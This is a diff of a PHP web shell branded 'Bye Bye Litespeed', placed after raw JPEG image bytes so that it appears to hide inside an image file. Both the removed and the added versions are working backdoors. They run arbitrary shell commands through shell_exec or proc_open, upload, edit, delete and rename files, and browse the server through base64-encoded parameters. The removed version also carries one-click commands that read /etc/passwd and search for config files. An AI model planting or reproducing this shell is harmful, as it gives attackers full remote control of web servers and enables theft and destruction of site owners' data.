@@ -29,150 +29,148 @@ Fi²ÓÕYÅ×7rz{ÙÌí9YI&`IT vn>õ;¬ð™%š.ˆNiiêníóG¨Q: 3ÕÆu
 çšß"§%¬È6Ê¸éùø·>éÃ>ëGWD œßÇyQ¨´÷§õŠk—÷,"Â‘²Ž`¸2¨õu”NÊÔNrˆ³ï5wNÙ7ô†|Ô›·Ì.1þ¶cßâþe
 —DŸÐNþ;Ô[$SÖ#ù™ú/î9CùÏ™G` Gõ¾Cù¯ÿÄ $          !01@"2AQÿÚ ? lÎù3ÒÄ·ÁŽ–/¢ÅôX´BøÃHsú)¦=Ø´ˆø,šŠ-õ,Sœ¿§¦›d·z?k±Á}­±/p«H§†{È=žŒ»„+$9dQq›"°92˜´œ2I(‘Á'”Tù?r5à[1kê`Ô„žÊ ŠÖ»·×˜ñ“ˆI7&$ÒðµCÖO1eñÄ™È«ÓJEt¨_èS!éc~&GçJ-±Gy2d^ZMqäkcòÅå®Š¾IüjÅç¶Š ‹CÕ•¡"Ö.—«+oSÚ±–u=«gÐ¬%ÿÄ %          !01A"B#Q`ÿÚ ? ÿ Ã[Sþ‡\‘…ÛÉÑ)È†•DÄ"jÇ}k–FŸt*gcCÑ&JMŒ±f$(~Ì²8™ût®£ž^|`Uúò{E–
 ‘ŠI²É#?nŸ£Mb„ˆIKÖbF-dž;øÇ^OƒI<à‚Ê-‡©2k‚Yr{Ð¶éíq’*»1E×ä’”‹ÒŠMïBÚž$+RŠ%R\²íL*X-ºVÏuZ·QfºV¹>_{xCšlXFrc¡m¯O,](CÛt¸*åøCÞ„=’e’Ê)ùðº‡å2H©r!ô¡ùú-ñWZŸ¢ßmCÚ‡å|2Ï–"½±%µÏÑ?‘õÿ ÿÙ<!DOCTYPE html>
-<!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BYE BYE LITESPEED | CYBER PANEL</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    
+    <title>Good Bye Litespeed</title>
+    <link href="https://fonts.googleapis.com/css?family=Arial%20Black" rel="stylesheet">
+    <style type="text/css">* {cursor: url(https://ani.cursors-4u.net/cursors/cur-13/cur1161.ani), url(https://ani.cursors-4u.net/cursors/cur-13/cur1161.png), auto !important;}</style><a href="https://www.cursors-4u.com/cursor/2018/06/08/hell-yeah-pointer-4.html" target="_blank" title="Hell Yeah Pointer 4"><img src="https://cur.cursors-4u.net/cursor.png" border="0" alt="Hell Yeah Pointer 4" style="position:absolute; top: 0px; right: 0px;" /></a>
     <style>
-        :root {
-            --neon-red: #ff003c;
-            --dark-red: #800020;
-            --bg-deep: #050505;
-            --card-glass: rgba(20, 20, 20, 0.9);
-            --matrix-green: #00ff41;
-        }
-
         body {
-            background-color: var(--bg-deep);
-            background-image: 
-                linear-gradient(rgba(255, 0, 0, 0.05) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255, 0, 0, 0.05) 1px, transparent 1px);
-            background-size: 30px 30px;
-            color: #fff;
-            font-family: 'Fira Code', monospace;
-            margin: 0; padding: 0; overflow-x: hidden;
+             font-family: 'Arial Black';
+             color: rgb(255, 255, 255);
+             margin: 0;
+             padding: 0;
+             background-color: #242222c9;
+             text-shadow: 2px 2px 4px rgba(90, 88, 88, 0.5);
+             background-size: cover;
+             background-position: center;
+}
+        .container {
+            width: 80%;
+            margin: 20px auto;
+            padding: 40px;
+            background-color: #1e1e1e;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
-
-        .navbar {
-            background: rgba(0,0,0,0.9);
-            padding: 15px 30px;
-            border-bottom: 2px solid var(--neon-red);
-            display: flex; justify-content: space-between; align-items: center;
-            box-shadow: 0 0 15px var(--dark-red);
-        }
-
-        .neon-title {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 1.5rem;
-            color: var(--neon-red);
-            text-shadow: 0 0 10px var(--neon-red);
-            letter-spacing: 2px;
-        }
-
-        .main-grid {
-            display: grid;
-            grid-template-columns: 280px 1fr;
-            min-height: calc(100vh - 70px);
-        }
-
-        /* Sidebar */
-        .sidebar {
-            background: rgba(10, 10, 10, 0.95);
-            padding: 20px;
-            border-right: 1px solid #222;
-        }
-
-        .cmd-btn {
-            display: block; width: 100%;
-            background: #111; border: 1px solid var(--dark-red);
-            color: #ccc; padding: 10px; margin-bottom: 8px;
-            text-align: left; cursor: pointer; transition: 0.3s;
-            font-size: 12px; border-radius: 4px;
-        }
-        .cmd-btn:hover {
-            background: var(--neon-red); color: white;
-            box-shadow: 0 0 10px var(--neon-red);
-        }
-
-        /* Content Area */
-        .content { padding: 25px; }
-
-        .path-display {
-            background: #111; padding: 12px; border-radius: 5px;
-            border-left: 4px solid var(--neon-red); margin-bottom: 20px;
-        }
-
-        .path-display a { color: var(--neon-red); text-decoration: none; }
-
-        .terminal-container {
-            background: #000; border: 1px solid #333;
-            border-radius: 8px; margin-bottom: 25px; overflow: hidden;
-        }
-
-        .terminal-header {
-            background: #222; padding: 8px 15px; font-size: 12px;
-            display: flex; justify-content: space-between;
-        }
-
         .result-box {
-            width: 100%; height: 200px; background: transparent;
-            color: var(--matrix-green); border: none; padding: 15px;
-            font-family: 'Fira Code', monospace; resize: none;
+            width: 97.5%;
+            height: 200px;
+            resize: none;
+            overflow: auto;
+            font-family: 'Arial Black';
+            background-color: #f4f4f4;
+            padding: 10px;
+            border: 1px solid #ddd;
+            margin-bottom: 10px;
+        }
+        hr {
+            border: 0;
+            border-top: 1px solid #ddd;
+            margin: 20px 0;
+        }
+        a {
+            color: #ffffff;
+            text-shadow:0 0 6px #000000;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: #5c5c5c;
+        }
+        tr:nth-child(even) {
+            background-color: #9c9b9bce;
+        }
+        input[type="text"], input[type="submit"],input[type="file"], textarea[name="file_content"] {
+            width: calc(97.5% - 10px);
+            margin-bottom: 10px;
+            padding: 8px;
+            max-height: 200px;
+            resize: vertical;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            font-family: 'Arial Black';
+        }
+        textarea[name="file_content"] {
+            width: calc(97.5% - 10px);
+            margin-bottom: 10px;
+            padding: 8px;
+            padding-bottom: 77px;
+            max-height: 200px;
+            resize: vertical;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            font-family: 'Arial Black';
+        }
+        input[type="submit"] {
+            background-color: #128616;
+            color: white;
+            font-family: 'Arial Black';
+            border: none;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #143015;
+        }
+        .item-name {
+            max-width: 200px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        td.size {
+    width: 100px;
+}
+.date {
+            max-width: 200px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
         }
 
-        /* File Explorer Table */
-        .explorer-table {
-            width: 100%; border-collapse: collapse; background: var(--card-glass);
-            border-radius: 8px; overflow: hidden;
+        .writable {
+            color: rgb(13, 178, 2);
+            text-shadow:0 0 7px #000000;
         }
-
-        .explorer-table th {
-            background: var(--dark-red); color: white; padding: 15px; text-align: left;
+        .not-writable {
+            color: rgb(216, 9, 9);
+            text-shadow:0 0 5px #000000;
         }
-
-        .explorer-table td {
-            padding: 12px 15px; border-bottom: 1px solid #222;
-            transition: 0.2s;
-        }
-
-        .explorer-table tr:hover { background: rgba(255, 0, 0, 0.05); }
-
-        .btn-action {
-            padding: 6px 12px; border-radius: 4px; border: none;
-            cursor: pointer; margin-right: 4px; font-size: 12px;
-        }
-
-        .btn-view { background: #007bff; color: white; }
-        .btn-del { background: #dc3545; color: white; }
-        
-        .img-preview {
-            max-width: 200px; border: 2px solid var(--neon-red);
-            border-radius: 5px; margin: 10px 0;
-        }
-
-        .status-pill {
-            padding: 2px 8px; border-radius: 10px; font-size: 10px;
-            background: #333; color: #fff;
-        }
+        .permission {
+        font-weight: bold;
+        width: 50px;
+        height: 20px;
+        text-align: center;
+        line-height: 20px;
+        overflow: hidden;
+    }
+    
     </style>
 </head>
 <body>
-
+<div class="container">
 <?php
-// --- منطق الـ PHP الأصلي الخاص بك (بدون تغيير) ---
 $timezone = date_default_timezone_get();
 date_default_timezone_set($timezone);
 $rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
 $scriptDirectory = dirname(__FILE__);
 
-function x($b) { return base64_encode($b); }
-function y($b) { return base64_decode($b); }
+function x($b)
+{
+    return base64_encode($b);
+}
+
+function y($b)
+{
+    return base64_decode($b);
+}
 
 foreach ($_GET as $c => $d) $_GET[$c] = y($d);
 
@@ -180,156 +178,182 @@ $currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
 chdir($currentDirectory);
 
 $viewCommandResult = '';
-$previewImage = '';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // [منطق الأوامر الأصلي]
-    if (isset($_POST['cmd_input'])) {
-        $command = $_POST['cmd_input'];
-        $viewCommandResult = shell_exec($command . ' 2>&1');
-    }
-    // [منطق الحذف والرفع والإنشاء الأصلي]
     if (isset($_FILES['fileToUpload'])) {
-        move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $currentDirectory . '/' . $_FILES["fileToUpload"]["name"]);
-    }
-    if (isset($_POST['delete_file'])) {
-        $f = $currentDirectory . '/' . $_POST['delete_file'];
-        is_dir($f) ? shell_exec("rm -rf $f") : unlink($f);
-    }
-    // [اوبشن عرض الصور الجديد]
-    if (isset($_POST['view_image'])) {
-        $imgFile = $_POST['view_image'];
-        $ext = strtolower(pathinfo($imgFile, PATHINFO_EXTENSION));
-        if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp'])) {
-            $previewImage = $imgFile;
+        $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
+        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+            echo "File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " telah diunggah.";
+        } else {
+            echo "Maaf, terjadi kesalahan saat mengunggah file Anda.";
+        }
+    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
+        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
+        if (!file_exists($newFolder)) {
+            mkdir($newFolder);
+            echo '<hr>Folder created successfully!';
+        } else {
+            echo '<hr>Error: Folder already exists!';
+        }
+    } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
+        $fileName = $_POST['file_name'];
+        $newFile = $currentDirectory . '/' . $fileName;
+        if (!file_exists($newFile)) {
+            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
+                echo '<hr>File created successfully!';
+            } else {
+                echo '<hr>Error: Failed to create file!';
+            }
+        } else {
+            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
+                echo '<hr>File edited successfully!';
+            } else {
+                echo '<hr>Error: Failed to edit file!';
+            }
+        }
+    } elseif (isset($_POST['delete_file'])) {
+        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
+        if (file_exists($fileToDelete)) {
+            if (is_dir($fileToDelete)) {
+                if (deleteDirectory($fileToDelete)) {
+                    echo '<hr>Folder deleted successfully!';
+                } else {
+                    echo '<hr>Error: Failed to delete folder!';
+                }
+            } else {
+                if (unlink($fileToDelete)) {
+                    echo '<hr>File deleted successfully!';
+                } else {
+                    echo '<hr>Error: Failed to delete file!';
+                }
+            }
+        } else {
+            echo '<hr>Error: File or directory not found!';
+        }
+    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
+        $oldName = $currentDirectory . '/' . $_POST['old_name'];
+        $newName = $currentDirectory . '/' . $_POST['new_name'];
+        if (file_exists($oldName)) {
+            if (rename($oldName, $newName)) {
+                echo '<hr>Item renamed successfully!';
+            } else {
+                echo '<hr>Error: Failed to rename item!';
+            }
+        } else {
+            echo '<hr>Error: Item not found!';
+        }
+    } elseif (isset($_POST['cmd_input'])) {
+        $command = $_POST['cmd_input'];
+        $descriptorspec = [
+            0 => ['pipe', 'r'],
+            1 => ['pipe', 'w'],
+            2 => ['pipe', 'w']
+        ];
+        $process = proc_open($command, $descriptorspec, $pipes);
+        if (is_resource($process)) {
+            $output = stream_get_contents($pipes[1]);
+            $errors = stream_get_contents($pipes[2]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            proc_close($process);
+            if (!empty($errors)) {
+                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($errors) . '</textarea>';
+            } else {
+                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
+            }
+        } else {
+            $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
+        }
+    } elseif (isset($_POST['view_file'])) {
+        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
+        if (file_exists($fileToView)) {
+            $fileContent = file_get_contents($fileToView);
+            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
+        } else {
+            $viewCommandResult = '<hr><p>Error: File not found!</p>';
         }
     }
 }
+
+echo '<center>
+<div class="fig-ansi">
+<pre id="taag_font_ANSIShadow" class="fig-ansi"><span style="color: rgb(67, 142, 241);">   <strong>  __    Bye Bye Litespeed   _____ __    
+    __|  |___ ___ ___ ___ ___   |   __|  | v.1.2
+|  |  | .\'| . | . | .\'|   |  |__   |  |__ 
+|_____|__,|_  |___|__,|_|_|  |_____|_____|
+                |___| ./Heartzz                      </strong> </span></pre>
+</div>
+</center>';
+echo "Zona waktu server: " . $timezone . "<br>";
+echo "Waktu server saat ini: " . date('Y-m-d H:i:s');
+echo '<hr>curdir: ';
+
+$directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
+$currentPath = '';
+$homeLinkPrinted = false;
+foreach ($directories as $index => $dir) {
+    $currentPath .= DIRECTORY_SEPARATOR . $dir;
+    if ($index == 0) {
+        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
+    } else {
+        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
+    }
+}
+
+echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
+echo '<br>';
+echo '<hr><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
+echo '<input type="text" name="folder_name" placeholder="New Folder Name">';
+echo '<input type="submit" value="Create Folder">';
+echo '</form>';
+echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
+echo '<input type="text" name="file_name" placeholder="Create New File / Edit Existing File">';
+echo '<textarea name="file_content" placeholder="File Content (for new file) or Edit Content (for existing file)"></textarea>';
+echo '<input type="submit" value="Create / Edit File">';
+echo '</form>';
+echo '<form method="post" enctype="multipart/form-data">';
+echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="pilih file:">';
+echo '<input type="submit" value="Upload File" name="submit">';
+echo '</form>';
+echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form>';
+echo $viewCommandResult;
+echo '<div>';
+echo '</div>';
+echo '<table border=1>';
+echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center>';
+foreach (scandir($currentDirectory) as $v) {
+    $u = realpath($v);
+    $s = stat($u);
+    $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
+    $permission = substr(sprintf('%o', fileperms($u)), -4);
+    $writable = is_writable($u);
+    echo '<tr>
+            <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
+            <td class="size">'.filesize($u).'</td>
+            <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($u)).'</td>
+            <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
+            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.htmlspecialchars($v).'"><input type="submit" value=" View  "></form></td>
+            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.htmlspecialchars($v).'"><input type="submit" value="Delete "></form></td>
+            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.htmlspecialchars($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr>';
+}
+
+echo '</table>';
+function deleteDirectory($dir) {
+    if (!file_exists($dir)) {
+        return true;
+    }
+    if (!is_dir($dir)) {
+        return unlink($dir);
+    }
+    foreach (scandir($dir) as $item) {
+        if ($item == '.' || $item == '..') {
+            continue;
+        }
+        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
+            return false;
+        }
+    }
+    return rmdir($dir);
+}
 ?>
-
-<div class="navbar">
-    <div class="neon-title"><i class="fas fa-biohazard"></i> BYE BYE LITESPEED</div>
-    <div style="font-size: 12px;">
-        <span style="color: var(--neon-red);">SERVER:</span> <?php echo $_SERVER['SERVER_ADDR']; ?> | 
-        <span style="color: var(--neon-red);">USER:</span> <?php echo get_current_user(); ?>
-    </div>
-</div>
-
-<div class="main-grid">
-    <aside class="sidebar">
-        <h3 style="color: var(--neon-red); font-size: 14px; border-bottom: 1px solid #333; padding-bottom: 10px;">QUICK COMMANDS</h3>
-        
-        <form method="post">
-            <button name="cmd_input" value="id" class="cmd-btn"><i class="fas fa-fingerprint"></i> Check ID</button>
-            <button name="cmd_input" value="uname -a" class="cmd-btn"><i class="fas fa-microchip"></i> Kernel Info</button>
-            <button name="cmd_input" value="cat /etc/passwd" class="cmd-btn"><i class="fas fa-users"></i> Read Users</button>
-            <button name="cmd_input" value="netstat -antup" class="cmd-btn"><i class="fas fa-network-wired"></i> Open Ports</button>
-            <button name="cmd_input" value="ls -la /var/www/html" class="cmd-btn"><i class="fas fa-list"></i> List Web Root</button>
-            <button name="cmd_input" value="find . -type f -name '*.config*'" class="cmd-btn"><i class="fas fa-search"></i> Search Configs</button>
-        </form>
-
-        <hr style="border-color: #222;">
-        
-        <h3 style="color: var(--neon-red); font-size: 14px;">UTILITIES</h3>
-        <form method="post" enctype="multipart/form-data">
-            <input type="file" name="fileToUpload" style="font-size: 10px;">
-            <input type="submit" value="UPLOAD" class="cmd-btn" style="background: var(--dark-red); color: #fff;">
-        </form>
-    </aside>
-
-    <main class="content">
-        <div class="path-display">
-            <i class="fas fa-terminal" style="color: var(--matrix-green);"></i> 
-            <?php
-            $dirs = explode(DIRECTORY_SEPARATOR, $currentDirectory);
-            $p = '';
-            foreach ($dirs as $d) {
-                if ($d === "") continue;
-                $p .= DIRECTORY_SEPARATOR . $d;
-                echo ' / <a href="?d=' . x($p) . '">' . $d . '</a>';
-            }
-            ?>
-        </div>
-
-        <div class="terminal-container">
-            <div class="terminal-header">
-                <span>Console Output</span>
-                <span style="color: var(--neon-red);">● ● ●</span>
-            </div>
-            <form method="post">
-                <textarea name="cmd_input" class="result-box" placeholder="Enter custom bash command here..."><?php echo htmlspecialchars($viewCommandResult); ?></textarea>
-                <div style="padding: 10px; background: #111;">
-                    <input type="submit" value="EXECUTE COMMAND" style="background: var(--dark-red); color: white; border: none; padding: 5px 20px; cursor: pointer;">
-                </div>
-            </form>
-        </div>
-
-        <?php if($previewImage): ?>
-        <div style="background: #111; padding: 20px; border: 1px solid var(--neon-red); margin-bottom: 20px; text-align: center;">
-            <h4>Image Preview: <?php echo $previewImage; ?></h4>
-            <img src="data:image/png;base64,<?php echo base64_encode(file_get_contents($previewImage)); ?>" class="img-preview">
-            <br><button onclick="this.parentElement.remove()" class="btn-action btn-del">Close Preview</button>
-        </div>
-        <?php endif; ?>
-
-        <table class="explorer-table">
-            <thead>
-                <tr>
-                    <th>Name</th>
-                    <th>Size</th>
-                    <th>Perms</th>
-                    <th>Actions</th>
-                </tr>
-            </thead>
-            <tbody>
-                <?php
-                foreach (scandir($currentDirectory) as $v) {
-                    if($v == "." || $v == "..") continue;
-                    $u = $currentDirectory . '/' . $v;
-                    $isDir = is_dir($u);
-                    $perm = substr(sprintf('%o', fileperms($u)), -4);
-                    $writable = is_writable($u);
-                    $ext = strtolower(pathinfo($v, PATHINFO_EXTENSION));
-                ?>
-                <tr>
-                    <td>
-                        <i class="fas <?php echo $isDir ? 'fa-folder' : 'fa-file'; ?>" style="color: <?php echo $isDir ? '#ffcc00' : '#888'; ?>; margin-right: 10px;"></i>
-                        <a href="<?php echo $isDir ? '?d='.x($u) : '#'; ?>" style="color: #fff; text-decoration: none;"><?php echo $v; ?></a>
-                    </td>
-                    <td style="font-size: 11px; color: #aaa;"><?php echo $isDir ? '--' : round(filesize($u)/1024, 2).' KB'; ?></td>
-                    <td><span class="status-pill <?php echo $writable ? 'writable' : ''; ?>" style="color: <?php echo $writable ? var(--matrix-green) : '#ff4d4d'; ?>"><?php echo $perm; ?></span></td>
-                    <td>
-                        <div style="display: flex;">
-                            <?php if(in_array($ext, ['jpg', 'png', 'gif', 'jpeg'])): ?>
-                                <form method="post"><input type="hidden" name="view_image" value="<?php echo $v; ?>"><button class="btn-action btn-view"><i class="fas fa-image"></i> Show</button></form>
-                            <?php endif; ?>
-                            <form method="post"><input type="hidden" name="view_file" value="<?php echo $v; ?>"><button class="btn-action btn-view"><i class="fas fa-edit"></i> Edit</button></form>
-                            <form method="post" onsubmit="return confirm('Delete?')"><input type="hidden" name="delete_file" value="<?php echo $v; ?>"><button class="btn-action btn-del"><i class="fas fa-trash-alt"></i></button></form>
-                        </div>
-                    </td>
-                </tr>
-                <?php } ?>
-            </tbody>
-        </table>
-    </main>
-</div>
-
-<script>
-    // إضافة لمسة جمالية عند الضغط على الأوامر
-    document.querySelectorAll('.cmd-btn').forEach(btn => {
-        btn.addEventListener('click', () => {
-            Swal.fire({
-                title: 'Executing Command...',
-                toast: true,
-                position: 'top-end',
-                showConfirmButton: false,
-                timer: 1000,
-                background: '#111',
-                color: '#fff'
-            });
-        });
-    });
-</script>
-
-</body>
-</html>
